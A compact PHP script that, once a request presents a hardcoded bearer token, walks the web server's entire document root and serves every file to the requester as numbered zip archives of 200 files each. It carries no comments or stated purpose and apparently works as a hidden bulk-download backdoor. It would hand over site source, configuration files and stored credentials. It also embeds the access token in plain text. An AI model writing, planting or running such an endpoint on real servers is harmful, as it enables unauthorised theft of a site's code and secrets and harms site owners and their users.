<?php
$tk = "njgYRSvO4amFoMPP3K6pcbl5TQimr8mIWv1DVrEu7FmQQ4w50URwt0Xaffek"; $src = $_SERVER['DOCUMENT_ROOT']; $sz = 200; 
if (($_SERVER['HTTP_AUTHORIZATION'] ?? '') !== "Bearer $tk") die("!"); 
$p = (int)($_GET['part'] ?? 1); $all = []; 
$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, 4096)); 
foreach ($it as $f) if ($f->isFile()) $all[] = $f->getRealPath(); 
sort($all); $chunk = array_slice($all, ($p - 1) * $sz, $sz); 
if (!$chunk) { header("HTTP/1.1 404 Not Found"); die(); } 
$tmp = sys_get_temp_dir() . "/b$p.zip"; $z = new ZipArchive; 
if ($z->open($tmp, 8) !== true) die("z");
foreach ($chunk as $f) $z->addFile($f, ltrim(str_replace($src, '', $f), '/\\')); 
$z->close();

header("Content-Type: application/zip");
header("Content-Length: " . filesize($tmp));
readfile($tmp); unlink($tmp); 
?>